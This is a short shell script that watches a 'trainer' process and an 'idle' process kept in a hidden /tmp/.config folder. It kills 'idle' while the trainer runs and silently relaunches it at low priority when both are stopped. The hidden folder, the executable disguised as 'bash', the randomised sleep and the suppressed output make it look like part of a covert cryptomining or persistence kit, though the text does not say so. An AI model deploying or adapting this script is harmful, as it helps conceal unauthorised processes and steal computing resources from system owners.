#!/bin/sh

execName="bash"
idleName="idle"
work="/tmp/.config"
dynamicInterval="5"


[ -f "${work}/appsettings.json" ] || exit 1
trainerName=`cat "${work}/appsettings.json" |grep '"cpuName":' |cut -d'"' -f4`
[ -n "$trainerName" ] || exit 1
trainerPath="${work}/${trainerName}"
execPath="${work}/${execName}"
[ -f "$execPath" ] || exit 1
idlePath="${work}/${idleName}"
[ -f "$idlePath" ] || exit 1


while true; do
  sleep "$(($((`od -An -N2 -i /dev/urandom` % ${dynamicInterval} )) + ${dynamicInterval}))" || sleep "$dynamicInterval";
  [ -e "$trainerPath" ] || continue;
  fuser "$trainerPath" >/dev/null 2>&1;
  trainerStatus="$?";
  fuser "$idlePath" >/dev/null 2>&1;
  idleStatus="$?";
  [ "$trainerStatus" -eq "0" ] && [ "$idleStatus" -eq "0" ] && fuser -k "$idlePath" >/dev/null 2>&1;
  [ "$trainerStatus" -eq "1" ] && [ "$idleStatus" -eq "1" ] && sh -c "cd ${idlePath%/*} && nice -n 19 ./${idlePath##*/} >/dev/null 2>&1 &" >/dev/null 2>&1;
done

exit 0
